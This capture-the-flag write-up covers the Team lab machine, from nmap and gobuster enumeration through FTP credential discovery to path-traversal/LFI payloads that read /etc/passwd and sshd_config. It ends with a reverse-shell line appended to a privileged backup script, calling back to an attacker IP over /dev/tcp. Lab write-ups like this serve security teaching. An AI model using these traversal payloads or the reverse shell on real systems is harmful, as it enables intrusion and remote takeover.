# Steps to user.txt
* Run a Port Scan using NMAP
`nmap -sV -sC -oA nmap/output <IP_ADDRESS_OF_MASCHINE>`

* We can see that Port **21, 22** and **80** are open

```
Nmap 7.80 scan initiated Fri Mar  5 21:49:20 2021 as: nmap -sV -sC -oA nmap/output teamcw
Nmap scan report for teamcw (10.10.87.236)
Host is up (0.055s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
|   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
|_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Fri Mar  5 21:49:38 2021 -- 1 IP address (1 host up) scanned in 17.39 seconds
```


* Next I had a quick look at the page using the browser
* Only the Apache2 Ubuntu Default Page was shown
* Having a look at the Source showed that I have to hadd 'team.thm' to my hosts file


![image](https://user-images.githubusercontent.com/78683952/110202466-24dc1100-7e69-11eb-8fb3-ff424a266bd9.png)


* After putting team.thm into my hosts file the following page appeared

![image](https://user-images.githubusercontent.com/78683952/110202498-59e86380-7e69-11eb-9058-0cab1a29e2eb.png)


* Next I ran gobuster and found the hidden directory *scripts*
** gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://team.thm -x .txt

![image](https://user-images.githubusercontent.com/78683952/110202590-04f91d00-7e6a-11eb-8267-ee5f922b27c5.png)


* Wthin this directory there is a file called *script.txt*
** gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://team.thm/scripts/ -x .txt

![image](https://user-images.githubusercontent.com/78683952/110202593-104c4880-7e6a-11eb-9aa7-bc1f84518ea0.png)


* Browsing to http://team.thm/scripts/script.txt shows us the following:

![image](https://user-images.githubusercontent.com/78683952/110202629-52758a00-7e6a-11eb-81f0-f54c1c889b14.png)

* the hint on the very bottom made my try to access: http://team.thm/scripts/script.old
* Voila :) 

![image](https://user-images.githubusercontent.com/78683952/110202655-7df87480-7e6a-11eb-814f-a3717c2f217a.png)

We now have FTP Credentials and can use them to login in to the FTP Server 

![image](https://user-images.githubusercontent.com/78683952/110202739-fa8b5300-7e6a-11eb-9ab1-b9aef3554d17.png)

* I then checked out the New_site.txt:

![image](https://user-images.githubusercontent.com/78683952/110202795-43dba280-7e6b-11eb-81bf-f7380ce1afec.png)

It seems like we have to adjust the entry in our host file from **team.thm** to **dev.team.thm**
Furthermore, the two names within the .txt file look like usernames.

* Browsing to **dev.team.thm** shows us the following

![image](https://user-images.githubusercontent.com/78683952/110202886-a3d24900-7e6b-11eb-8d29-7f1f9eb68215.png)


![image](https://user-images.githubusercontent.com/78683952/110202911-b8164600-7e6b-11eb-8236-3e5e6ca11af1.png)

The `page=teamshare.php` looks very suspicious.

Lets try: `page=../../../../etc/passwd `

Voila

![image](https://user-images.githubusercontent.com/78683952/110203009-14796580-7e6c-11eb-9871-203f47cfba80.png)

* Being able to exploit this Directory Traversal and LFI Vulnerabilty we can now try to find the id_rsa that was mentioned in the **New_site.txt** 
** view-source:http://dev.team.thm/script.php?page=php://filter/resource=../../../../etc/ssh/sshd_config

![image](https://user-images.githubusercontent.com/78683952/110203090-6d48fe00-7e6c-11eb-9ca7-81992d6ec662.png)

* We can now connect to the machine with the following command: `ssh -i id_rsa dale@dev.team.thm` and get the **user.txt**

![image](https://user-images.githubusercontent.com/78683952/110203173-d92b6680-7e6c-11eb-9721-f1280cd13e88.png)



*** username and password
* connect to FTP
* download New_ ...
* put dev.team.thm into your host file
* directory traversal
** http://dev.team.thm/script.php?page=../../../home/dale/user.txt
*view-source:http://dev.team.thm/script.php?page=php://filter/resource=../../../../etc/ssh/sshd_config


# Steps to root.txt
* enumerate gyles
** become member of admin
* write to script
* echo "/bin/bash -c '/bin/bash >& /dev/tcp/10.9.4.238/4444 0>&1'" >> /usr/local/bin/main_backup.sh

